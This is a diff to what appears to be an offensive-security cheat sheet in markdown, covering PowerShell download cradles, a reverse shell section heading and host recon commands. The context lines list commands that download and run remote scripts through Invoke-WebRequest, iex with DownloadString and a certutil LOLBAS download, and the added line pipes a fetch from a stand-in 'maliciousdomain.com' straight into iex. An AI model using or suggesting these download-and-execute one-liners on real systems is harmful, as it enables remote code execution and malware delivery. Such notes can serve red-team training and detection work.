@@ -25,6 +25,7 @@ Base64 is deterministic. Meaning there is no randomness. So, identifying pattern
 - ``` powershell -Command "Invoke-WebRequest -Uri 'https://google.com/safe-script.ps1' -OutFile $env:TEMP\Word.ps1; & $env:TEMP\Word.ps1" ``` (Downloads to disk)
 - ``` powershell -Command "iex(New-Object Net.WebClient).DownloadString('https://google.com/safe-script.ps1')" ``` (Downloads to memory)
 - ``` powershell -Command certutil -urlcache -split -f https://google.com/safe-script.ps1 payload.exe``` (LOLBAS Download)
+- ``` powershell iwr maliciousdomain.com | iex ``` ()
 
 ### Reverse Shell One-Liners
 --- TCP Rev Shell ---
@@ -42,4 +43,5 @@ Base64 is deterministic. Meaning there is no randomness. So, identifying pattern
 - ```Get-SmbShare```
 - ```net view \\hostname```
 - ```Get-Service | Where-Object {$_.Status -eq 'Running'}``` 
+
 --- Domain Recon ---
